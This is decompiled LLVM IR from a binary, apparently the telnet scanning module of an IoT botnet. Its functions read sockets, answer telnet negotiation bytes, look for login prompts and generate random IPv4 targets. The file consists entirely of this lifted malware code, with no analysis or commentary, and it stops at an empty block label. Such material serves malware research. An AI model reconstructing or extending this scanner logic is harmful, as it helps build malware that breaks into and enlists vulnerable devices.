  store i32 %arg1, i32* @r3, align 4
  %v0_10002fa0 = call i32 @__GI_strlen()
  store i32 ptrtoint ([6 x i8]* @global_var_10017b48.56 to i32), i32* @r3, align 4
  %v0_100030dc10 = call i32 @__GI_strlen()
  %v2_100030e412 = icmp eq i32 %v0_100030dc10, 0
  br i1 %v2_100030e412, label %dec_label_pc_100030f4, label %dec_label_pc_10002fcc.preheader.lr.ph

dec_label_pc_10002fcc.preheader.lr.ph:            ; preds = %entry
  %v2_10002fe8 = add i32 %v0_10002fa0, %arg1
  br label %dec_label_pc_10002fcc.preheader

dec_label_pc_10002fc0:                            ; preds = %dec_label_pc_10003054, %dec_label_pc_1000302c, %dec_label_pc_10003004, %dec_label_pc_10002fdc
  %v1_10002fc4 = add nsw i32 %stack_var_-40.08, 1
  %v3_10002fd4 = icmp sgt i32 %v0_10002fa0, %v1_10002fc4
  br i1 %v3_10002fd4, label %dec_label_pc_10002fdc, label %dec_label_pc_1000307c

dec_label_pc_10002fdc:                            ; preds = %dec_label_pc_10002fcc.preheader, %dec_label_pc_10002fc0
  %stack_var_-40.08 = phi i32 [ %v1_10002fc4, %dec_label_pc_10002fc0 ], [ %stack_var_-40.115, %dec_label_pc_10002fcc.preheader ]
  %v2_10002ff0 = sub i32 %v2_10002fe8, %stack_var_-40.08
  %v1_10002ff4 = inttoptr i32 %v2_10002ff0 to i8*
  %v2_10002ff4 = load i8, i8* %v1_10002ff4, align 1
  %v3_10002ffc = icmp eq i8 %v2_10002ff4, 0
  br i1 %v3_10002ffc, label %dec_label_pc_10002fc0, label %dec_label_pc_10003004

dec_label_pc_10003004:                            ; preds = %dec_label_pc_10002fdc
  %v2_1000301c = load i8, i8* %v1_10002ff4, align 1
  %v3_10003024 = icmp eq i8 %v2_1000301c, 32
  br i1 %v3_10003024, label %dec_label_pc_10002fc0, label %dec_label_pc_1000302c

dec_label_pc_1000302c:                            ; preds = %dec_label_pc_10003004
  %v2_10003044 = load i8, i8* %v1_10002ff4, align 1
  %v3_1000304c = icmp eq i8 %v2_10003044, 13
  br i1 %v3_1000304c, label %dec_label_pc_10002fc0, label %dec_label_pc_10003054

dec_label_pc_10003054:                            ; preds = %dec_label_pc_1000302c
  %v2_1000306c = load i8, i8* %v1_10002ff4, align 1
  %v3_10003074 = icmp eq i8 %v2_1000306c, 10
  br i1 %v3_10003074, label %dec_label_pc_10002fc0, label %dec_label_pc_1000307c

dec_label_pc_1000307c:                            ; preds = %dec_label_pc_10003054, %dec_label_pc_10002fc0, %dec_label_pc_10002fcc.preheader
  %stack_var_-40.0.lcssa = phi i32 [ %stack_var_-40.115, %dec_label_pc_10002fcc.preheader ], [ %stack_var_-40.08, %dec_label_pc_10003054 ], [ %v1_10002fc4, %dec_label_pc_10002fc0 ]
  %v2_10003090 = sub i32 %v2_10002fe8, %stack_var_-40.0.lcssa
  %v1_10003094 = inttoptr i32 %v2_10003090 to i8*
  %v2_10003094 = load i8, i8* %v1_10003094, align 1
  %v2_100030a8 = add i32 %storemerge316, ptrtoint ([6 x i8]* @global_var_10017b48.56 to i32)
  %v1_100030ac = inttoptr i32 %v2_100030a8 to i8*
  %v2_100030ac = load i8, i8* %v1_100030ac, align 1
  %v4_100030b4 = icmp eq i8 %v2_10003094, %v2_100030ac
  br i1 %v4_100030b4, label %dec_label_pc_100030f4, label %dec_label_pc_100030c8

dec_label_pc_100030c8:                            ; preds = %dec_label_pc_1000307c
  %v1_100030cc = add i32 %storemerge316, 1
  store i32 ptrtoint ([6 x i8]* @global_var_10017b48.56 to i32), i32* @r3, align 4
  %v0_100030dc = call i32 @__GI_strlen()
  %v2_100030e4 = icmp ult i32 %v1_100030cc, %v0_100030dc
  br i1 %v2_100030e4, label %dec_label_pc_10002fcc.preheader, label %dec_label_pc_100030f4

dec_label_pc_10002fcc.preheader:                  ; preds = %dec_label_pc_10002fcc.preheader.lr.ph, %dec_label_pc_100030c8
  %storemerge316 = phi i32 [ 0, %dec_label_pc_10002fcc.preheader.lr.ph ], [ %v1_100030cc, %dec_label_pc_100030c8 ]
  %stack_var_-40.115 = phi i32 [ 0, %dec_label_pc_10002fcc.preheader.lr.ph ], [ %stack_var_-40.0.lcssa, %dec_label_pc_100030c8 ]
  %v3_10002fd46 = icmp sgt i32 %v0_10002fa0, %stack_var_-40.115
  br i1 %v3_10002fd46, label %dec_label_pc_10002fdc, label %dec_label_pc_1000307c

dec_label_pc_100030f4:                            ; preds = %entry, %dec_label_pc_1000307c, %dec_label_pc_100030c8
  %storemerge = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_1000307c ], [ 0, %dec_label_pc_100030c8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-40.115, { 2, 0, 1 }
  uselistorder i32 %storemerge316, { 1, 0 }
  uselistorder i32 %v1_100030cc, { 1, 0 }
  uselistorder i32 %v0_10002fa0, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_10017b48.56 to i32), { 2, 1, 0 }
  uselistorder label %dec_label_pc_100030f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002fcc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000307c, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %v0_10003148 = load i32, i32* @r10, align 4
  store i32 %arg4, i32* %stack_var_-64, align 4
  %v1_100033885 = add i32 %v0_10003148, 2
  %v2_100033906 = icmp slt i32 %v1_100033885, %arg7
  br i1 %v2_100033906, label %dec_label_pc_10003398.lr.ph, label %dec_label_pc_100033c8

dec_label_pc_10003398.lr.ph:                      ; preds = %entry
  %v2_10003180 = ptrtoint i32* %stack_var_-192 to i32
  %v1_100031c8 = udiv i32 %arg1, 32
  %v1_100031d0 = mul nuw nsw i32 %v1_100031c8, 4
  %v2_100031d4 = ptrtoint i32* %stack_var_-216 to i32
  %v2_100031d8 = add nuw nsw i32 %v1_100031d0, 24
  %v1_100031dc = add i32 %v2_100031d8, %v2_100031d4
  %v1_100031e0 = inttoptr i32 %v1_100031dc to i32*
  %v1_100031e8 = urem i32 %arg1, 32
  %v3_100031f0 = shl i32 1, %v1_100031e8
  %v1_10003210 = add i32 %arg1, 1
  %v2_10003218 = ptrtoint i32* %stack_var_-64 to i32
  %v4_10003348 = inttoptr i32 %arg2 to i8*
  %v3_1000335c = icmp eq i32 %arg3, 0
  %v2_100033a8 = icmp sgt i32 %arg5, 0
  br label %dec_label_pc_10003398

dec_label_pc_10003180:                            ; preds = %dec_label_pc_100033a4, %dec_label_pc_10003398
  store i32 %v2_10003180, i32* %stack_var_-216, align 4
  store i32 0, i32* %stack_var_-192, align 4
  br label %dec_label_pc_10003194.dec_label_pc_10003194_crit_edge

dec_label_pc_10003194.dec_label_pc_10003194_crit_edge: ; preds = %dec_label_pc_10003194.dec_label_pc_10003194_crit_edge.dec_label_pc_10003194.dec_label_pc_10003194_crit_edge_crit_edge, %dec_label_pc_10003180
  %v3_10003198.pre = phi i32 [ %v2_10003180, %dec_label_pc_10003180 ], [ %v3_10003198.pre.pre, %dec_label_pc_10003194.dec_label_pc_10003194_crit_edge.dec_label_pc_10003194.dec_label_pc_10003194_crit_edge_crit_edge ]
  %v1_100031b036 = phi i32 [ 1, %dec_label_pc_10003180 ], [ %v1_100031b0, %dec_label_pc_10003194.dec_label_pc_10003194_crit_edge.dec_label_pc_10003194.dec_label_pc_10003194_crit_edge_crit_edge ]
  %v1_1000319c = mul nuw nsw i32 %v1_100031b036, 4
  %v2_100031a0 = add i32 %v1_1000319c, %v3_10003198.pre
  %v2_100031a8 = inttoptr i32 %v2_100031a0 to i32*
  store i32 0, i32* %v2_100031a8, align 4
  %v1_100031b0 = add nuw nsw i32 %v1_100031b036, 1
  %tmp33 = icmp ult i32 %v1_100031b0, 32
  br i1 %tmp33, label %dec_label_pc_10003194.dec_label_pc_10003194_crit_edge.dec_label_pc_10003194.dec_label_pc_10003194_crit_edge_crit_edge, label %dec_label_pc_100031c4

dec_label_pc_10003194.dec_label_pc_10003194_crit_edge.dec_label_pc_10003194.dec_label_pc_10003194_crit_edge_crit_edge: ; preds = %dec_label_pc_10003194.dec_label_pc_10003194_crit_edge
  %v3_10003198.pre.pre = load i32, i32* %stack_var_-216, align 4
  br label %dec_label_pc_10003194.dec_label_pc_10003194_crit_edge

dec_label_pc_100031c4:                            ; preds = %dec_label_pc_10003194.dec_label_pc_10003194_crit_edge
  %v2_100031e0 = load i32, i32* %v1_100031e0, align 4
  %v2_100031f4 = or i32 %v2_100031e0, %v3_100031f0
  store i32 %v2_100031f4, i32* %v1_100031e0, align 4
  store i32 268448308, i32* @lr, align 4
  %v5_10003230 = call i32 @__libc_select(i32 %v1_10003210, i32 %v2_10003180, i32 0, i32 0, i32 %v2_10003218)
  %tmp34 = icmp slt i32 %v5_10003230, 1
  br i1 %tmp34, label %dec_label_pc_100033c8, label %dec_label_pc_10003240

dec_label_pc_10003240:                            ; preds = %dec_label_pc_100031c4
  %v2_1000324c = add i32 %stack_var_-196.09, %arg6
  store i32 268448360, i32* @lr, align 4
  %v4_10003264 = call i32 @__libc_recv(i32 %arg1, i32 %v2_1000324c, i32 1, i32 0)
  %v4_10003278 = icmp eq i32 %v4_10003264, -1
  br i1 %v4_10003278, label %dec_label_pc_1000328c, label %dec_label_pc_10003280

dec_label_pc_10003280:                            ; preds = %dec_label_pc_10003240
  %v3_10003284 = icmp eq i32 %v4_10003264, 0
  br i1 %v3_10003284, label %dec_label_pc_1000328c, label %dec_label_pc_10003298

dec_label_pc_1000328c:                            ; preds = %dec_label_pc_10003280, %dec_label_pc_10003240
  br label %dec_label_pc_100033d0

dec_label_pc_10003298:                            ; preds = %dec_label_pc_10003280
  %v2_100032a0 = add i32 %v4_10003264, %stack_var_-196.09
  %v4_100032a8 = inttoptr i32 %v2_1000324c to i8*
  %v3_100032ac = load i8, i8* %v4_100032a8, align 1
  %v3_100032b4 = icmp eq i8 %v3_100032ac, -1
  br i1 %v3_100032b4, label %dec_label_pc_100032bc, label %dec_label_pc_10003340

dec_label_pc_100032bc:                            ; preds = %dec_label_pc_10003298
  %v1_100032c0 = add i32 %v2_1000324c, 1
  store i32 268448472, i32* @lr, align 4
  %v4_100032d4 = call i32 @__libc_recv(i32 %arg1, i32 %v1_100032c0, i32 2, i32 0)
  %v4_100032e8 = icmp eq i32 %v4_100032d4, -1
  br i1 %v4_100032e8, label %dec_label_pc_100032fc, label %dec_label_pc_100032f0

dec_label_pc_100032f0:                            ; preds = %dec_label_pc_100032bc
  %v3_100032f4 = icmp eq i32 %v4_100032d4, 0
  br i1 %v3_100032f4, label %dec_label_pc_100032fc, label %dec_label_pc_10003308

dec_label_pc_100032fc:                            ; preds = %dec_label_pc_100032f0, %dec_label_pc_100032bc
  br label %dec_label_pc_100033d0

dec_label_pc_10003308:                            ; preds = %dec_label_pc_100032f0
  %v2_10003310 = add i32 %v4_100032d4, %v2_100032a0
  store i32 268448552, i32* @lr, align 4
  %v4_10003324 = call i32 @negotiate(i32 %arg1, i32 %v2_1000324c, i32 3, i32 %v2_100032a0)
  %v3_1000332c = icmp eq i32 %v4_10003324, 0
  br i1 %v3_1000332c, label %dec_label_pc_10003334, label %dec_label_pc_10003384.backedge

dec_label_pc_10003334:                            ; preds = %dec_label_pc_10003308
  br label %dec_label_pc_100033d0

dec_label_pc_10003340:                            ; preds = %dec_label_pc_10003298
  store i32 268448588, i32* @lr, align 4
  %v5_10003348 = call i32 @strstr(i32 %arg6, i8* %v4_10003348, i32 %v2_1000324c)
  %v3_10003350 = icmp eq i32 %v5_10003348, 0
  br i1 %v3_10003350, label %dec_label_pc_10003358, label %dec_label_pc_100033bc

dec_label_pc_10003358:                            ; preds = %dec_label_pc_10003340
  br i1 %v3_1000335c, label %dec_label_pc_10003384.backedge, label %dec_label_pc_10003364

dec_label_pc_10003384.backedge:                   ; preds = %dec_label_pc_10003358, %dec_label_pc_10003364, %dec_label_pc_10003308
  %stack_var_-196.0.be = phi i32 [ %v2_10003310, %dec_label_pc_10003308 ], [ %v2_100032a0, %dec_label_pc_10003358 ], [ %v2_100032a0, %dec_label_pc_10003364 ]
  %v1_10003388 = add i32 %stack_var_-196.0.be, 2
  %v2_10003390 = icmp slt i32 %v1_10003388, %arg7
  br i1 %v2_10003390, label %dec_label_pc_10003384.backedge.dec_label_pc_10003398_crit_edge, label %dec_label_pc_100033c8

dec_label_pc_10003384.backedge.dec_label_pc_10003398_crit_edge: ; preds = %dec_label_pc_10003384.backedge
  %v3_10003398.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_10003398

dec_label_pc_10003364:                            ; preds = %dec_label_pc_10003358
  %v1_10003368 = call i32 @matchPrompt(i32 %arg6)
  %v3_10003370 = icmp eq i32 %v1_10003368, 0
  br i1 %v3_10003370, label %dec_label_pc_10003384.backedge, label %dec_label_pc_100033bc

dec_label_pc_10003398:                            ; preds = %dec_label_pc_10003384.backedge.dec_label_pc_10003398_crit_edge, %dec_label_pc_10003398.lr.ph
  %v3_10003398 = phi i32 [ %arg4, %dec_label_pc_10003398.lr.ph ], [ %v3_10003398.pre, %dec_label_pc_10003384.backedge.dec_label_pc_10003398_crit_edge ]
  %stack_var_-196.09 = phi i32 [ %v0_10003148, %dec_label_pc_10003398.lr.ph ], [ %stack_var_-196.0.be, %dec_label_pc_10003384.backedge.dec_label_pc_10003398_crit_edge ]
  %v2_1000339c = icmp sgt i32 %v3_10003398, 0
  br i1 %v2_1000339c, label %dec_label_pc_10003180, label %dec_label_pc_100033a4

dec_label_pc_100033a4:                            ; preds = %dec_label_pc_10003398
  br i1 %v2_100033a8, label %dec_label_pc_10003180, label %dec_label_pc_100033c8

dec_label_pc_100033bc:                            ; preds = %dec_label_pc_10003340, %dec_label_pc_10003364
  br label %dec_label_pc_100033d0

dec_label_pc_100033c8:                            ; preds = %dec_label_pc_10003384.backedge, %dec_label_pc_100033a4, %dec_label_pc_100031c4, %entry
  br label %dec_label_pc_100033d0

dec_label_pc_100033d0:                            ; preds = %dec_label_pc_100033bc, %dec_label_pc_10003334, %dec_label_pc_100032fc, %dec_label_pc_1000328c, %dec_label_pc_100033c8
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_100033c8 ], [ 1, %dec_label_pc_100033bc ], [ 0, %dec_label_pc_1000328c ], [ 0, %dec_label_pc_100032fc ], [ 0, %dec_label_pc_10003334 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %stack_var_-196.09, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.be, { 1, 0 }
  uselistorder i32 %v2_100032a0, { 1, 2, 3, 0 }
  uselistorder i32 %v1_100031b0, { 1, 0 }
  uselistorder i32 %v2_10003180, { 1, 0, 2 }
  uselistorder i32* %stack_var_-64, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 4, 3, 1, 0, 2 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_100033d0, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_100033c8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_100033bc, { 1, 0 }
  uselistorder label %dec_label_pc_10003384.backedge, { 1, 0, 2 }
}

define i32 @FindingRandomIP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  store i8 0, i8* bitcast (i32* @global_var_1002b911.58 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1002b912.59 to i8*), align 4
  store i8 0, i8* @global_var_1002b913.60, align 1
  store i8 0, i8* @global_var_1002b914.61, align 1
  store i32 268448840, i32* @lr, align 4
  %v1_10003444 = call i32 @random()
  %v2_10003464 = srem i32 %v1_10003444, 255
  %v1_1000348c = trunc i32 %v2_10003464 to i8
  store i8 %v1_1000348c, i8* bitcast (i32* @global_var_1002b911.58 to i8*), align 4
  store i32 268448916, i32* @lr, align 4
  %v1_10003490 = call i32 @random()
  %v2_100034b0 = srem i32 %v1_10003490, 255
  %v1_100034d8 = trunc i32 %v2_100034b0 to i8
  store i8 %v1_100034d8, i8* bitcast (i32* @global_var_1002b912.59 to i8*), align 4
  store i32 268448992, i32* @lr, align 4
  %v1_100034dc = call i32 @random()
  %v2_100034fc = srem i32 %v1_100034dc, 255
  %v1_10003524 = trunc i32 %v2_100034fc to i8
  store i8 %v1_10003524, i8* @global_var_1002b913.60, align 1
  store i32 268449068, i32* @lr, align 4
  %v1_10003528 = call i32 @random()
  %v2_10003548 = srem i32 %v1_10003528, 255
  %v1_10003570 = trunc i32 %v2_10003548 to i8
  store i8 %v1_10003570, i8* @global_var_1002b914.61, align 1
  store i32 268449144, i32* @lr, align 4
  %v1_10003574 = call i32 @random()
  %v2_10003594 = srem i32 %v1_10003574, 247
  %v3_100035a8 = icmp eq i32 %v2_10003594, 0
  br i1 %v3_100035a8, label %dec_label_pc_100035b0, label %dec_label_pc_100035f8

dec_label_pc_100035b0:                            ; preds = %entry
  %v2_100035b0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100035c4 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100035c4 = zext i8 %v3_100035c4 to i32
  %v4_100035f4 = call i32 @szprintf(i32 %v2_100035b0, i32 ptrtoint ([11 x i8]* @global_var_10017b50.62 to i32), i32 %v4_100035c4)
  br label %dec_label_pc_100035f8

dec_label_pc_100035f8:                            ; preds = %entry, %dec_label_pc_100035b0
  %v3_100035fc = icmp eq i32 %v2_10003594, 1
  br i1 %v3_100035fc, label %dec_label_pc_10003604, label %dec_label_pc_1000364c

dec_label_pc_10003604:                            ; preds = %dec_label_pc_100035f8
  %v2_10003604 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003618 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10003618 = zext i8 %v3_10003618 to i32
  %v4_10003648 = call i32 @szprintf(i32 %v2_10003604, i32 ptrtoint ([12 x i8]* @global_var_10017b5c.63 to i32), i32 %v4_10003618)
  br label %dec_label_pc_1000364c

dec_label_pc_1000364c:                            ; preds = %dec_label_pc_100035f8, %dec_label_pc_10003604
  %v3_10003650 = icmp eq i32 %v2_10003594, 2
  br i1 %v3_10003650, label %dec_label_pc_10003658, label %dec_label_pc_100036a0

dec_label_pc_10003658:                            ; preds = %dec_label_pc_1000364c
  %v2_10003658 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000366c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_1000366c = zext i8 %v3_1000366c to i32
  %v4_1000369c = call i32 @szprintf(i32 %v2_10003658, i32 ptrtoint ([12 x i8]* @global_var_10017b68.64 to i32), i32 %v4_1000366c)
  br label %dec_label_pc_100036a0

dec_label_pc_100036a0:                            ; preds = %dec_label_pc_1000364c, %dec_label_pc_10003658
  %v3_100036a4 = icmp eq i32 %v2_10003594, 3
  br i1 %v3_100036a4, label %dec_label_pc_100036ac, label %dec_label_pc_100036f4

dec_label_pc_100036ac:                            ; preds = %dec_label_pc_100036a0
  %v2_100036ac = ptrtoint i32* %stack_var_-52 to i32
  %v3_100036c0 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100036c0 = zext i8 %v3_100036c0 to i32
  %v4_100036f0 = call i32 @szprintf(i32 %v2_100036ac, i32 ptrtoint ([12 x i8]* @global_var_10017b74.65 to i32), i32 %v4_100036c0)
  br label %dec_label_pc_100036f4

dec_label_pc_100036f4:                            ; preds = %dec_label_pc_100036a0, %dec_label_pc_100036ac
  %v3_100036f8 = icmp eq i32 %v2_10003594, 4
  br i1 %v3_100036f8, label %dec_label_pc_10003700, label %dec_label_pc_10003748

dec_label_pc_10003700:                            ; preds = %dec_label_pc_100036f4
  %v2_10003700 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003714 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10003714 = zext i8 %v3_10003714 to i32
  %v4_10003744 = call i32 @szprintf(i32 %v2_10003700, i32 ptrtoint ([12 x i8]* @global_var_10017b80.66 to i32), i32 %v4_10003714)
  br label %dec_label_pc_10003748

dec_label_pc_10003748:                            ; preds = %dec_label_pc_100036f4, %dec_label_pc_10003700
  %v3_1000374c = icmp eq i32 %v2_10003594, 5
  br i1 %v3_1000374c, label %dec_label_pc_10003754, label %dec_label_pc_1000379c

dec_label_pc_10003754:                            ; preds = %dec_label_pc_10003748
  %v2_10003754 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003768 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10003768 = zext i8 %v3_10003768 to i32
  %v4_10003798 = call i32 @szprintf(i32 %v2_10003754, i32 ptrtoint ([12 x i8]* @global_var_10017b8c.67 to i32), i32 %v4_10003768)
  br label %dec_label_pc_1000379c

dec_label_pc_1000379c:                            ; preds = %dec_label_pc_10003748, %dec_label_pc_10003754
  %v3_100037a0 = icmp eq i32 %v2_10003594, 6
  br i1 %v3_100037a0, label %dec_label_pc_100037a8, label %dec_label_pc_100037f0

dec_label_pc_100037a8:                            ; preds = %dec_label_pc_1000379c
  %v2_100037a8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100037bc = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100037bc = zext i8 %v3_100037bc to i32
  %v4_100037ec = call i32 @szprintf(i32 %v2_100037a8, i32 ptrtoint ([13 x i8]* @global_var_10017b98.68 to i32), i32 %v4_100037bc)
  br label %dec_label_pc_100037f0

dec_label_pc_100037f0:                            ; preds = %dec_label_pc_1000379c, %dec_label_pc_100037a8
  %v3_100037f4 = icmp eq i32 %v2_10003594, 7
  br i1 %v3_100037f4, label %dec_label_pc_100037fc, label %dec_label_pc_10003844

dec_label_pc_100037fc:                            ; preds = %dec_label_pc_100037f0
  %v2_100037fc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003810 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10003810 = zext i8 %v3_10003810 to i32
  %v4_10003840 = call i32 @szprintf(i32 %v2_100037fc, i32 ptrtoint ([13 x i8]* @global_var_10017ba8.69 to i32), i32 %v4_10003810)
  br label %dec_label_pc_10003844

dec_label_pc_10003844:                            ; preds = %dec_label_pc_100037f0, %dec_label_pc_100037fc
  %v3_10003848 = icmp eq i32 %v2_10003594, 8
  br i1 %v3_10003848, label %dec_label_pc_10003850, label %dec_label_pc_10003898

dec_label_pc_10003850:                            ; preds = %dec_label_pc_10003844
  %v2_10003850 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003864 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10003864 = zext i8 %v3_10003864 to i32
  %v4_10003894 = call i32 @szprintf(i32 %v2_10003850, i32 ptrtoint ([13 x i8]* @global_var_10017bb8.70 to i32), i32 %v4_10003864)
  br label %dec_label_pc_10003898

dec_label_pc_10003898:                            ; preds = %dec_label_pc_10003844, %dec_label_pc_10003850
  %v3_1000389c = icmp eq i32 %v2_10003594, 9
  br i1 %v3_1000389c, label %dec_label_pc_100038a4, label %dec_label_pc_100038ec

dec_label_pc_100038a4:                            ; preds = %dec_label_pc_10003898
  %v2_100038a4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100038b8 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100038b8 = zext i8 %v3_100038b8 to i32
  %v4_100038e8 = call i32 @szprintf(i32 %v2_100038a4, i32 ptrtoint ([13 x i8]* @global_var_10017bc8.71 to i32), i32 %v4_100038b8)
  br label %dec_label_pc_100038ec

dec_label_pc_100038ec:                            ; preds = %dec_label_pc_10003898, %dec_label_pc_100038a4
  %v3_100038f0 = icmp eq i32 %v2_10003594, 10
  br i1 %v3_100038f0, label %dec_label_pc_100038f8, label %dec_label_pc_10003940

dec_label_pc_100038f8:                            ; preds = %dec_label_pc_100038ec
  %v2_100038f8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000390c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_1000390c = zext i8 %v3_1000390c to i32
  %v4_1000393c = call i32 @szprintf(i32 %v2_100038f8, i32 ptrtoint ([13 x i8]* @global_var_10017bd8.72 to i32), i32 %v4_1000390c)
  br label %dec_label_pc_10003940

dec_label_pc_10003940:                            ; preds = %dec_label_pc_100038ec, %dec_label_pc_100038f8
  %v3_10003944 = icmp eq i32 %v2_10003594, 11
  br i1 %v3_10003944, label %dec_label_pc_1000394c, label %dec_label_pc_10003994

dec_label_pc_1000394c:                            ; preds = %dec_label_pc_10003940
  %v2_1000394c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003960 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10003960 = zext i8 %v3_10003960 to i32
  %v4_10003990 = call i32 @szprintf(i32 %v2_1000394c, i32 ptrtoint ([13 x i8]* @global_var_10017be8.73 to i32), i32 %v4_10003960)
  br label %dec_label_pc_10003994

dec_label_pc_10003994:                            ; preds = %dec_label_pc_10003940, %dec_label_pc_1000394c
  %v3_10003998 = icmp eq i32 %v2_10003594, 12
  br i1 %v3_10003998, label %dec_label_pc_100039a0, label %dec_label_pc_100039e8

dec_label_pc_100039a0:                            ; preds = %dec_label_pc_10003994
  %v2_100039a0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100039b4 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100039b4 = zext i8 %v3_100039b4 to i32
  %v4_100039e4 = call i32 @szprintf(i32 %v2_100039a0, i32 ptrtoint ([13 x i8]* @global_var_10017bf8.74 to i32), i32 %v4_100039b4)
  br label %dec_label_pc_100039e8

dec_label_pc_100039e8:                            ; preds = %dec_label_pc_10003994, %dec_label_pc_100039a0
  %v3_100039ec = icmp eq i32 %v2_10003594, 13
  br i1 %v3_100039ec, label %dec_label_pc_100039f4, label %dec_label_pc_10003a3c

dec_label_pc_100039f4:                            ; preds = %dec_label_pc_100039e8
  %v2_100039f4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003a08 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10003a08 = zext i8 %v3_10003a08 to i32
  %v4_10003a38 = call i32 @szprintf(i32 %v2_100039f4, i32 ptrtoint ([13 x i8]* @global_var_10017c08.75 to i32), i32 %v4_10003a08)
  br label %dec_label_pc_10003a3c

dec_label_pc_10003a3c:                            ; preds = %dec_label_pc_100039e8, %dec_label_pc_100039f4
  %v3_10003a40 = icmp eq i32 %v2_10003594, 14
  br i1 %v3_10003a40, label %dec_label_pc_10003a48, label %dec_label_pc_10003a90

dec_label_pc_10003a48:                            ; preds = %dec_label_pc_10003a3c
  %v2_10003a48 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003a5c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10003a5c = zext i8 %v3_10003a5c to i32
  %v4_10003a8c = call i32 @szprintf(i32 %v2_10003a48, i32 ptrtoint ([12 x i8]* @global_var_10017c18.76 to i32), i32 %v4_10003a5c)
  br label %dec_label_pc_10003a90

dec_label_pc_10003a90:                            ; preds = %dec_label_pc_10003a3c, %dec_label_pc_10003a48
  %v3_10003a94 = icmp eq i32 %v2_10003594, 15
  br i1 %v3_10003a94, label %dec_label_pc_10003a9c, label %dec_label_pc_10003ae4

dec_label_pc_10003a9c:                            ; preds = %dec_label_pc_10003a90
  %v2_10003a9c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003ab0 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10003ab0 = zext i8 %v3_10003ab0 to i32
  %v4_10003ae0 = call i32 @szprintf(i32 %v2_10003a9c, i32 ptrtoint ([12 x i8]* @global_var_10017c24.77 to i32), i32 %v4_10003ab0)
  br label %dec_label_pc_10003ae4

dec_label_pc_10003ae4:                            ; preds = %dec_label_pc_10003a90, %dec_label_pc_10003a9c
  %v3_10003ae8 = icmp eq i32 %v2_10003594, 16
  br i1 %v3_10003ae8, label %dec_label_pc_10003af0, label %dec_label_pc_10003b38

dec_label_pc_10003af0:                            ; preds = %dec_label_pc_10003ae4
  %v2_10003af0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003b04 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10003b04 = zext i8 %v3_10003b04 to i32
  %v4_10003b34 = call i32 @szprintf(i32 %v2_10003af0, i32 ptrtoint ([13 x i8]* @global_var_10017c30.78 to i32), i32 %v4_10003b04)
  br label %dec_label_pc_10003b38

dec_label_pc_10003b38:                            ; preds = %dec_label_pc_10003ae4, %dec_label_pc_10003af0
  %v3_10003b3c = icmp eq i32 %v2_10003594, 17
  br i1 %v3_10003b3c, label %dec_label_pc_10003b44, label %dec_label_pc_10003b8c

dec_label_pc_10003b44:                            ; preds = %dec_label_pc_10003b38
  %v2_10003b44 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003b58 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10003b58 = zext i8 %v3_10003b58 to i32
  %v4_10003b88 = call i32 @szprintf(i32 %v2_10003b44, i32 ptrtoint ([13 x i8]* @global_var_10017c40.79 to i32), i32 %v4_10003b58)
  br label %dec_label_pc_10003b8c

dec_label_pc_10003b8c:                            ; preds = %dec_label_pc_10003b38, %dec_label_pc_10003b44
  %v3_10003b90 = icmp eq i32 %v2_10003594, 18
  br i1 %v3_10003b90, label %dec_label_pc_10003b98, label %dec_label_pc_10003be0

dec_label_pc_10003b98:                            ; preds = %dec_label_pc_10003b8c
